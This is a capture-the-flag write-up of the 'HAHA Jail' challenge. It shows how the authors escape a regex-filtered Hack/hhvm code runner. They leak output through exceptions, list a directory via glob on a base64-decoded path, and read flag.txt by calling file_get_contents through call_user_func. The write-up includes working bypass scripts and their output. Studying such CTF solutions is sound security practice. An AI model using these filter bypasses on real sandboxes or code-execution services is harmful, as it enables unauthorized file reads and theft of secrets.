# HAHA Jail

Points: 226

Solves: 15

Solved by: drw0if, 0xThorn

## Challenge description

One day I was Hacking some Big Banks, and next morning I woke up here... In a cold, dirty cell. I used my last Philipinian Pesos to dig tunnel but always ended in place where I have stared. Now as we met here, could you help me get away from there? If you do I will give you a flag.

http://hahajail.zajebistyc.tf

(Source provided)

## Solution

### Analysis

![Home](images/home.png)

The source provided to us contains two files. Let's start by looking at `index.php` and it is immediately obvious that it is not written in php. Doing a bit of research shows that it is hacklang, a PHP dialect, which provides some security enhancements, such as removing the `eval()` function.

This first file is useless: it just creates the main page. `hack.php` is much more interesting. It takes the input provided in the home page and checks with a regex: if the text contains certain special characters (`. $ /`) or some functions followed by brackets (even separated by space) it returns the message `Leave me alone hacker`. Otherwise it saves the sent code in a randomly named file, executes it in hhvm and deletes it. If the execution is successful, the message `[filename] written` is shown, otherwise it shows the error.

### Strategy

We are not told what the goal is, probably we need to read the contents of some file, for example `flag.txt`.

The simplest solution to get output is to return an exception to the script to display the error while avoiding the useless success message.

For example this stript:

```php
<?hh
<<__EntryPoint>>
function main(): void {
throw new \Exception('Hello world');
}
```

returns this output: `Fatal error: Uncaught exception 'Exception' with message 'Hello world' in /var/www/ea415ae3-2117-49ea-b48f-0dd5695a1980.php:4 Stack trace: #0 (): main() #1 {main}`

### Execution

The first thing to find out is the directory we're in. To do this we used `printcwd` which is not blocked by the regex. Turns out our directory is `/` (root). Interesting files will likely be contained here or in `/var/www`, where all the site files are saved.

To read the contents of a directory you should use `scandir`, but the regex doesn't allow this. Luckily we could use the `glob` function on `/var/www/*` which returns an array that we had to transform into a string in order to show it in the exception output. Finally, `/var/www/*` contains special characters not allowed by the regex but we just encoded it in base64 and decoded it in the script to bypass this limitation.

The final script to do this is:

```php
<?hh
<<__EntryPoint>>
function main(): void {
throw new \Exception(implode(' ', glob(base64_decode('L3Zhci93d3cvKg=='))));
}
```

which returns this output: `Fatal error: Uncaught exception 'Exception' with message '/var/www/challenge.json /var/www/composer.json /var/www/composer.lock /var/www/deploy /var/www/description.html /var/www/ef003628-ab92-45c7-a6aa-0d39cc5d4a2b.php /var/www/exploit.php /var/www/flag.txt /var/www/for_players /var/www/hh_autoload.json /var/www/libprotobuf.so.10 /var/www/public /var/www/vendor' in /var/www/ef003628-ab92-45c7-a6aa-0d39cc5d4a2b.php:4 Stack trace: #0 (): main() #1 {main}`

There it is, the `/var/www/flag.txt` file. Now comes the tricky part: reading the content. All functions that allow you to read a file are blocked by the regex. We needed a good idea.

After many experiments it became clear that the regex did not find a match if the name of one of those functions was contained in the text, but only if it was followed by an opening parenthesis.

Here's the idea: rename or call the function through a string. We tried with `rename-function` but we got `undefined function rename_function` and hacklang's alternative `fb_rename_function` was disabled. Plan B: call the function through a string with `call_user_func`.

We won! This script:

```php
<?hh
<<__EntryPoint>>
function main(): void {
throw new \Exception(call_user_func("file_get_contents", base64_decode("L3Zhci93d3cvZmxhZy50eHQ="))); // /var/www/flag.txt is encoded in b64
}
```

was succesful and returned this output containing the file content (the flag): `Fatal error: Uncaught exception 'Exception' with message 'p4{h4x0riN9_7H3_H4ck} ' in /var/www/13b8b6de-c5fe-4bb8-9ed8-92290c718c75.php:4 Stack trace: #0 (): main() #1 {main}`.

It worked because file_get_contents was followed by quotes and not an opening parenthesis.
